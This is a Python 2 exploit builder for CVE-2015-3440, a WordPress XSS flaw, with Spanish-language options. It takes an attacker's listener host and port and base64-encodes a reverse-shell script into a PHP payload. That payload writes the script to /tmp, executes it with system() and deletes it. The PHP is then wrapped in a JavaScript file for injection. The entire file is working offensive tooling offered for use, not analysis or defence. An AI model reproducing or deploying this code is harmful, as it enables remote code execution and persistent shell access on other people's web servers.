#!/usr/bin/python2
# -*- coding: utf-8 -*-
#c0ded by geek0
#u5ing infodox pty shell
import subprocess, base64, sys, urllib
import argparse

shellcode = open('shell.py').read()

print """
    ▄    ▄▄▄▄▄    ▄▄▄▄▄       ████▄     ▄   ▄███▄   █▄▄▄▄ ▄████  █    ████▄   ▄ ▄   
▀▄   █  █     ▀▄ █     ▀▄     █   █      █  █▀   ▀  █  ▄▀ █▀   ▀ █    █   █  █   █  
  █ ▀ ▄  ▀▀▀▀▄ ▄  ▀▀▀▀▄       █   █ █     █ ██▄▄    █▀▀▌  █▀▀    █    █   █ █ ▄   █ 
 ▄ █   ▀▄▄▄▄▀   ▀▄▄▄▄▀        ▀████  █    █ █▄   ▄▀ █  █  █      ███▄ ▀████ █  █  █ 
█   ▀▄                                █  █  ▀███▀     █    █         ▀       █ █ █  
 ▀                                     █▐            ▀      ▀                 ▀ ▀   
                                       ▐                                            
                                                              (CVE-2015-3440)
                                                                  geek0 (C)
"""

parser = argparse.ArgumentParser()
parser.add_argument('-l', '--lhost', dest='lhost', help='Listener (Ex. 8.8.8.8)', metavar='LHOST')
parser.add_argument('-p', '--lport', dest='lport', help='Puerto (Ex. 4444)', metavar='LPORT')
parser.add_argument('-d', '--directorio', dest='directorio', help='Directorio de la instalacion wordpress (Ex. /wordpress/)', metavar='/directorio/', default='')
parser.add_argument('-c', '--custom', dest='custom', help='Custom payload (Ex. custom.php)', metavar='CustomPayload')

def payload1(payload, directorio):
	payload = urllib.quote_plus(payload)
	payload = open('payload.js').read() % (directorio, directorio, payload, directorio, directorio)
	open('final.js', 'w').write(payload)
	print('[*] Payload generado con exito!')

def payload2(lhost, lport, shellcode, directorio):
	shellcode = base64.b64encode(shellcode % (lhost, lport))
	payload = '<?php file_put_contents("/tmp/shellcode.py", base64_decode("%s")); system("python /tmp/shellcode.py; rm /tmp/shellcode.py"); ?>' % (shellcode)
	payload1(payload, directorio)
	
if not len(sys.argv[1:]):
	parser.print_help()
else:
	args = parser.parse_args()
	if args.custom == None:
		print('[*] Usando payload por defecto...')
		lhost = args.lhost
		lport = args.lport
		directorio = args.directorio
		payload2(lhost, lport, shellcode, directorio)
	else:
		print('[*] Usando payload custom: %s' % (args.custom))
		payload = open(args.custom).read()
		directorio = args.directorio
		payload1(payload, directorio)
